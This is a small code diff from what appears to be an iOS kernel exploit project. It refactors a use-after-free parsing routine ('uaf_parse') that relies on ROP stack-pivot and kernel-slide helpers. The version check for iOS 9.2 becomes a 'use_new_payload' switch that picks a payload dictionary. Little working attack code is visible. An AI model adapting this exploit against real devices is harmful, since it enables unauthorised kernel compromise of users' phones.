@@ -7,8 +7,8 @@
 #include <mach/vm_map.h>
 
 #include "common.h"             // DEBUG, PRINT_BUF, file_t
-#include "device.h"             // V_*, get_os_version
 #include "io.h"                 // kOS*, OSString, dict_parse
+#include "offsets.h"            // use_new_payload
 #include "rop.h"                // get_stack_pivot
 #include "slide.h"              // get_kernel_slide
 
@@ -24,7 +24,7 @@ void uaf_parse(const OSString *fake)
     const char str[] = "str",
                ref[] = "ref";
 
-    if(get_os_version() >= V_13C75) // 9.2
+    if(use_new_payload())
     {
         uint32_t dict_92[] =
         {
